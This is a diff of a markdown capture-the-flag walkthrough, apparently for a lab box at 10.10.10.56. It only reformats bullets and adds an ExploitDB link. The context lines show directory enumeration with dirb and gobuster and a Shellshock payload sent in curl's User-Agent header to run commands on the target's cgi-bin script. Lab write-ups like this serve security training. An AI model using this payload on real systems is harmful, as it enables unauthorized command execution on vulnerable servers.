@@ -25,7 +25,7 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Running dirb tool 
+- Running dirb tool 
 ```
 dirb http://10.10.10.56/  
 
@@ -35,7 +35,7 @@ http://10.10.10.56/index.html (CODE:200|SIZE:137)
 
 Noting the name of the box, I can tell this is going to be a shellshock vunerability with the cgi-bin directory its a given! 
 
-/cgi-bin/
+- /cgi-bin/
 ```
 gobuster dir -u http://10.10.10.56/cgi-bin/ -w  /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt    -t 30 -x .txt,.html,.php,.bk,.gz,.png,.sh -s 403,200
 
@@ -46,7 +46,7 @@ gobuster dir -u http://10.10.10.56/cgi-bin/ -w  /usr/share/seclists/Discovery/We
 
 - Basic usage (Exploit)
 
-
+ExploitDB paper: https://www.exploit-db.com/docs/48112
 
 ```
 curl http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: text/plain';echo; /bin/ls"
